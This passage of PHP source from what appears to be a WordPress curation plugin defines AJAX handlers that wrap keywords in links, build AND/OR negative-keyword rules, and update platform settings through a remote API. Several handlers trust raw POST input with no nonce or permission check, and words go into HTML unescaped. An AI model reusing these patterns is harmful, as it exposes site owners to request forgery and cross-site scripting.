            $title_html .= ' '.$word;
        } else {
            $word =stripslashes($word);
            $title_html .= ' <a href="javascript:;" class="add_narrative_keyword">'.$word.'</a>';
        }
    }

    $split = preg_split("/[^\w]*([\s]+[^\w]*|$)/", $snippet, -1, PREG_SPLIT_NO_EMPTY);
    $snippet_html = '';
    foreach ($split as $word)
    {

        if(in_array(strtolower($word),$block_words_arr)) {
            $word =stripslashes($word);
            $snippet_html .= ' '.$word;
        } else {
            $word =stripslashes($word);
            $snippet_html .= ' <a href="javascript:;" class="add_narrative_keyword">'.$word.'</a>';
        }
    }
    $status = 'success';
    $message = '';


    echo json_encode(array('status' => $status, 'message' => $message, 'title_html' => $title_html, 'snippet_html' => $snippet_html));
    die();
}
add_action('wp_ajax_cs_le_get_narrative_elements', 'cs_le_get_narrative_elements');


function cs_le_add_narrative_action()
{
    $message = '';
    $status = '';
    $platform_id = trim($_POST['platform_id']);
    $narrative_keyword_1 = trim($_POST['narrative_keyword_1']);
    $narrative_keyword_2 = trim($_POST['narrative_keyword_2']);
    $narrative_keyword_3 = trim($_POST['narrative_keyword_3']);
    $narrative_select_1 = trim($_POST['narrative_select_1']);
    $narrative_select_2 = trim($_POST['narrative_select_2']);
    $narrative_strength_select = trim($_POST['narrative_strength_select']);
    $narrative_time_frame = trim($_POST['narrative_time_frame']);

    // Here we are using the negative keywords. Narrative block essentially is just adding negative keywords based on the logic chosen by the user

    $keywords_arr = array();
    $single_keyword = '';
    $sort_combined = $narrative_select_1 . '-' . $narrative_select_2;

    switch ($sort_combined) {
        case 'AND-AND':
            $single_keyword = $narrative_keyword_1;
            if($narrative_keyword_2 != '') {
                $single_keyword .= ' ' . $narrative_keyword_2;
                if($narrative_keyword_3 != '') {
                    $single_keyword .= ' ' . $narrative_keyword_3;
                }
            }
            $keywords_arr[]=$single_keyword;
            break;
        case 'OR-AND':
            // just 2 keywords
            if($narrative_keyword_2 != '' && $narrative_keyword_3 == '') {
                $keywords_arr[]=($narrative_keyword_1);
                $keywords_arr[]=($narrative_keyword_2);

            } else { // 3 keywords
                $keywords_arr[]=($narrative_keyword_1 . ' ' . $narrative_keyword_3);
                $keywords_arr[]=($narrative_keyword_2 . ' ' . $narrative_keyword_3);
            }
            if($narrative_keyword_1 == '' && $narrative_keyword_3 == '') {
                $keywords_arr[]=($narrative_keyword_1);
            }

            break;
        case 'AND-OR':
            $single_keyword = $narrative_keyword_1;
            if($narrative_keyword_2 != '') {
                $single_keyword .= ' ' . $narrative_keyword_2;
                $keywords_arr[]=($single_keyword);
                if($narrative_keyword_3 != '') {
                    $single_keyword = $narrative_keyword_1 . ' ' . $narrative_keyword_3;
                    $keywords_arr[]=($single_keyword);
                }
            } else {
                $keywords_arr[]=($single_keyword);
            }
            break;
        case 'OR-OR':
            $single_keyword = $narrative_keyword_1;
            $keywords_arr[]=($single_keyword);
            if($narrative_keyword_2 != '') {
                $keywords_arr[]=($narrative_keyword_2);
                if($narrative_keyword_3 != '') {
                    $keywords_arr[]=($narrative_keyword_3);
                }
            }
            break;
    }
    foreach($keywords_arr as $keyword) {
        $send_data = array(
            'keyword' => $keyword,
            'search_type' => $narrative_strength_select,
            'expire_at' => $narrative_time_frame,
            'is_narrative'=>true
        );
        $param_url_arr = array($platform_id, 'add');
        $return_data = ybi_curation_suite_api_call('platform/negative-keyword', $send_data, $param_url_arr);
        if ($return_data['status'] == 'success') {
            $status = 'success';
            $message = $return_data['message'];
        }
    }

    echo json_encode(array('status' => $status, 'message' => $message));
    die();

}
add_action('wp_ajax_cs_le_add_narrative_action', 'cs_le_add_narrative_action');

function cs_le_update_platform()
{
    $platform_id = trim($_POST['platform_id']);
    $platform_name = trim($_POST['platform_name']);
    $send_data = array(
        'platform_name' => $platform_name
    );
    $param_url_arr = array($platform_id, 'update');
    $return_data = ybi_curation_suite_api_call('platform', $send_data, $param_url_arr);

    $status = $return_data['status'];
    $message = $return_data['message'];

    echo json_encode(array('status' => $status, 'message' => $message));
    die();
}

add_action('wp_ajax_cs_le_update_platform', 'cs_le_update_platform');

function cs_le_toggle_platform_option()
{
    $platform_id = trim($_POST['platform_id']);
    $feature_name = trim($_POST['feature_name']);
    $send_data = array(
        'feature_name' => $feature_name
    );
    $param_url_arr = array($platform_id, 'feature-toggle');
    $return_data = ybi_curation_suite_api_call('platform', $send_data, $param_url_arr);

    $status = $return_data['status'];
    $message = $return_data['message'];

    echo json_encode(array('status' => $status, 'message' => $message));
    die();
}
add_action('wp_ajax_cs_le_toggle_platform_option', 'cs_le_toggle_platform_option');